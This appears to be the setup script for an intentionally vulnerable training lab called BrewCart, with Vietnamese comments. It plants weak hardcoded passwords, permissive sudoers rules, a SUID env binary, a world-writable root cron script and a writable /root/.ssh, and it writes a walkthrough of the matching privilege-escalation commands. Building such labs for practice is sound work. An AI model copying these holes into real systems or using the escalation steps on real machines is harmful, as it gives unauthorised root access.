#!/bin/bash
set -e

# Đảm bảo thư mục runtime của SSH tồn tại
mkdir -p /var/run/sshd /root/.ssh

# 1. Cấu hình tài khoản Quản trị viên (admin - UID 1000)
if ! id "admin" &>/dev/null; then
    useradd -m -s /bin/bash admin || true
fi
echo 'admin:AdminSecretPass2026!' | chpasswd
usermod -aG sudo admin || true

# 2. Cấu hình tài khoản Người dùng thường (developer - UID 1001) - Mật khẩu mặc định: 123456789
if ! id "developer" &>/dev/null; then
    useradd -m -s /bin/bash developer || true
fi
echo 'developer:123456789' | chpasswd
mkdir -p /home/developer/.ssh
chown -R developer:developer /home/developer

# 3. Cấu hình mật khẩu an toàn cho root (Cấm đăng nhập trực tiếp qua mật khẩu SSH, chỉ cho phép SSH Key hoặc Leo Quyền)
echo 'root:RootUltraSecurePass2026!' | chpasswd

# 4. Phân quyền sudoers phục vụ kịch bản Leo Thang Đặc Quyền (Privilege Escalation):
# - Leo quyền ngang (Horizontal PrivEsc): developer -> admin
echo 'developer ALL=(admin) NOPASSWD: /usr/bin/find, /bin/cat' > /etc/sudoers.d/developer_to_admin
# - Leo quyền dọc (Vertical PrivEsc): admin -> root
echo 'admin ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/admin_to_root
chmod 440 /etc/sudoers.d/*

# 5. Cấu hình SUID binary (/usr/bin/env) phục vụ Leo quyền dọc trực tiếp (developer -> root)
chmod 4755 /usr/bin/env || true

# 6. Tạo file hướng dẫn sẵn trong thư mục home của developer
cat << 'EOF' > /home/developer/HUONG_DAN_LEO_QUYEN.txt
================================================================================
🚀 BREWCART LAB: HƯỚNG DẪN THỰC HÀNH LEO THANG ĐẶC QUYỀN (PRIVILEGE ESCALATION)
================================================================================
Tài khoản hiện tại: developer (Low-privilege user - UID 1001)

[CHẶNG 1] LEO QUYỀN NGANG (Horizontal PrivEsc: developer -> admin):
  Kiểm tra quyền sudo:
    $ sudo -l
  Khai thác GTFOBins chạy find dưới quyền admin:
    $ sudo -u admin find . -exec /bin/bash \; -quit
  Kiểm tra lại danh tính:
    $ whoami   --> admin (UID 1000, nhóm sudo)

[CHẶNG 2] LEO QUYỀN DỌC (Vertical PrivEsc: admin -> root):
  Từ shell của admin, chạy lệnh quản trị tối cao:
    $ sudo su
  Kiểm tra lại danh tính:
    $ whoami   --> root (UID 0)

[CHẶNG 3] LEO QUYỀN DỌC TRỰC TIẾP (Direct Vertical PrivEsc: developer -> root):
  Tìm các file có cờ SUID trên hệ thống:
    $ find / -perm -4000 2>/dev/null
  Khai thác SUID binary /usr/bin/env:
    $ /usr/bin/env /bin/bash -p
  Kiểm tra lại danh tính:
    $ whoami   --> root (euid=0)

[CHẶNG 4] LEO QUYỀN QUA TIẾN TRÌNH CRON JOB CỦA HỆ THỐNG (Cron PrivEsc):
  Đọc file cron của hệ thống:
    $ cat /etc/cron.d/brewcart_backup
    (Thấy lệnh root chạy định kỳ mỗi 1 phút: /opt/scripts/backup.sh)
  Kiểm tra quyền của script backup:
    $ ls -la /opt/scripts/backup.sh
    (Thấy file có quyền ghi rwxrwxrwx thuộc sở hữu của developer)
  Chèn lệnh khai thác vào cuối script:
    $ echo "chmod 4755 /bin/bash" >> /opt/scripts/backup.sh
  Đợi tiến trình cron chạy (tối đa 60 giây), sau đó kích hoạt shell root:
    $ /bin/bash -p
  Kiểm tra lại danh tính:
    $ whoami   --> root (euid=0)
================================================================================
EOF
chown developer:developer /home/developer/HUONG_DAN_LEO_QUYEN.txt
chmod 644 /home/developer/HUONG_DAN_LEO_QUYEN.txt

# 7. Cấu hình Cron Job hệ thống chạy với quyền Root (Dính lỗi Writable Cron Script)
mkdir -p /opt/scripts /var/backups
cat << 'EOF' > /opt/scripts/backup.sh
#!/bin/bash
# Script sao lưu tự động hệ thống do Root thực thi định kỳ
tar -czf /var/backups/uploads_backup.tar.gz /var/www/html/public/uploads 2>/dev/null || true
EOF
chmod 777 /opt/scripts/backup.sh
chown developer:developer /opt/scripts/backup.sh

# Cấu hình cron chạy script mỗi 1 phút với quyền root (đăng ký cả ở /etc/cron.d và /etc/crontab)
cat << 'EOF' > /etc/cron.d/brewcart_backup
# Tiến trình sao lưu định kỳ của hệ thống BrewCart
* * * * * root /bin/bash /opt/scripts/backup.sh >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/brewcart_backup
if ! grep -q "/opt/scripts/backup.sh" /etc/crontab; then
    echo "* * * * * root /bin/bash /opt/scripts/backup.sh >/dev/null 2>&1" >> /etc/crontab
fi

# 8. Cấu hình OpenSSH:
# - Cho phép đăng nhập bằng password cho người dùng thông thường (developer)
# - Cấm đăng nhập root bằng mật khẩu (prohibit-password) để bắt buộc leo quyền hoặc dùng SSH Key
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
if ! grep -q "StrictModes no" /etc/ssh/sshd_config; then
    echo "StrictModes no" >> /etc/ssh/sshd_config
fi

# 9. Phân quyền thư mục .ssh để MySQL có thể ghi SSH key qua INTO OUTFILE
chmod 777 /root/.ssh || true
if [ -f /root/.ssh/authorized_keys ]; then
    chmod 666 /root/.ssh/authorized_keys || true
fi

# 10. Khởi động dịch vụ OpenSSH và Cron daemon
service ssh restart || /usr/sbin/sshd
service cron restart || cron || true

echo "[BrewCart] SSH Server started on port 22 (Host: 2022 / 2222)."
echo "[BrewCart] User Login: developer / Pass: 123456789 (Low-privilege SSH user)."
echo "[BrewCart] Privilege Escalation Ready: Sudoers, SUID /usr/bin/env & Cron Job /opt/scripts/backup.sh."

# 11. Chạy Apache ở chế độ foreground
exec apache2-foreground
